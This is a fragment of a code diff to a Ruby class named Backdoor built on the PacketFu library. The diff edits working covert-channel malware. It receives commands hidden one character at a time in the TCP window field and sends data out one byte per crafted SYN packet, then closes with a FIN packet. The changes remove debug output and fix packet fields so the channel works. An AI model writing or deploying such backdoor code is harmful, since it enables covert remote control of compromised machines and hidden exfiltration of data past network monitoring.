@@ -51,10 +51,8 @@ class Backdoor
             else
                 if @command.nil? then
                     @command = packet.tcp_win.chr
-                    puts @command
                 elsif
                     @command << packet.tcp_win.chr
-                    puts @command
                 end
             end # if
         end # if
@@ -63,14 +61,14 @@ class Backdoor
         #if packet.tcp_flags.syn == 1 and packet.tcp_flags.psh == 1 then
     end # process_packet
     
-    def send_data(data, packet)        
+    def send_data(data, packet)      
         data.each_byte do |word|
             tcp = PacketFu::TCPPacket.new()
             
             tcp.eth_saddr = @cfg[:eth_saddr]
-            tcp.eth_daddr = @cfg[:eth_daddr]
+            #tcp.eth_daddr = @cfg[:eth_daddr]
             tcp.tcp_src = rand(0xfff - 1024) + 1024
-            tcp.tcp_dst = @conf_array[3]
+            tcp.tcp_dst = @conf_array[3].to_i
             tcp.tcp_flags.syn = 1
             tcp.tcp_win = word
             tcp.tcp_seq = rand(0xffff)
@@ -84,9 +82,9 @@ class Backdoor
         tcp_fin = PacketFu::TCPPacket.new()
         
         tcp_fin.eth_saddr = @cfg[:eth_saddr]
-        tcp_fin.eth_daddr = @cfg[:eth_daddr]
+        #tcp_fin.eth_daddr = @cfg[:eth_daddr]
         tcp_fin.tcp_src = rand(0xfff - 1024) + 1024
-        tcp_fin.tcp_dst = @conf_array[3]
+        tcp_fin.tcp_dst = @conf_array[3].to_i
         tcp_fin.tcp_flags.fin = 1
         tcp_fin.tcp_seq = rand(0xffff)
         tcp_fin.ip_saddr = packet.ip_daddr
